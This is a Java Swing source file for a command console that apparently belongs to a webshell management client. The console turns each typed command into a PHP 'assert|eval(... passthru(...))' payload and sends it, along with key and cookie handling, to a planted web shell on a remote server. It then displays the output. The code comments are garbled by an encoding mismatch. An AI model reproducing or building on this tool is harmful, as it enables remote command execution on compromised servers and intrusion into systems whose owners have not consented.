import java.awt.BorderLayout;


import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.border.TitledBorder;
import javax.swing.text.DefaultCaret;
import javax.swing.JTextPane;
import javax.swing.text.Document;


public class ConsoleGui extends JFrame {
	//�������ɶ�ġ�����������
	//private static final long serialVersionUID = 1L;

	private JTextField tf_cmd;
	private JButton btn_run;
	private JTextArea ta_result;

	private Process process;
	private PrintWriter out;
	
	private String payload; //��󷢳�������payload

	public ConsoleGui(WebShell webshell) {
		// �����С
		this.setPreferredSize(new Dimension(500, 500));
		try {
			this.setIconImage(new ImageIcon(getClass().getResource("images/logo.png")).getImage());
		}catch(Exception e) {
			System.out.println(e.getMessage());
		}
		this.setTitle("�����ն�");

		// ����򼰰�ť
		TitledBorder titledBorder = new TitledBorder("Command input");
		JPanel topPanel = new JPanel(new BorderLayout());
		topPanel.setBorder(titledBorder);

		topPanel.add(tf_cmd = new JTextField(), BorderLayout.CENTER);
		topPanel.add(btn_run = new JButton("ִ��"), BorderLayout.EAST);
		tf_cmd.setFocusTraversalKeysEnabled(false);

		this.getContentPane().add(topPanel, BorderLayout.NORTH);

		// ��ʾ���
		JScrollPane resultPanel = new JScrollPane(ta_result = new JTextArea(10, 10));
		this.getContentPane().add(resultPanel);
		((DefaultCaret) ta_result.getCaret()).setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);

		/*��ֹ�Ӵ��ڹر�ʱ������Ҳһ��ر�*/
		this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		this.addWindowListener(new WindowAdapter() {// �����˳��¼�
			public void windowClosing(WindowEvent e) {
				//MainUi.RecoverFrame(); // ʹmain����ȡ������
				dispose();// �ͷŵ�ǰ������Դ����������Ϊ���ɼ�
			}
		});

		this.tf_cmd.addKeyListener(new KeyAdapter() {
			@Override
			public void keyReleased(KeyEvent e) {
				// ������а��»س������¼�
				if (e.getKeyCode() == KeyEvent.VK_ENTER) {
					btn_run.doClick();
					tf_cmd.setText("");
				}
			}
		});

		// ִ�а�ť ��������
		this.btn_run.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				if (tf_cmd.getText().equals(""))
					return;
			
				payload = "assert|eval('echo \"[S]\";echo passthru(\"" 
				           + tf_cmd.getText() + "\");echo \"[E]\";')";
				try {
					//System.out.println(payload);
					webshell.getKeyAndCookie();
					String html = webshell.sendPayload(payload);
					ta_result.append(html+"\n");
				}catch(Exception a) {
					System.out.println(a.getMessage()); 
				}
			}
		});
	}
	
	/*��ʾFrame*/
	public void showFrame() {
		this.pack();
		this.setVisible(true);
	}
}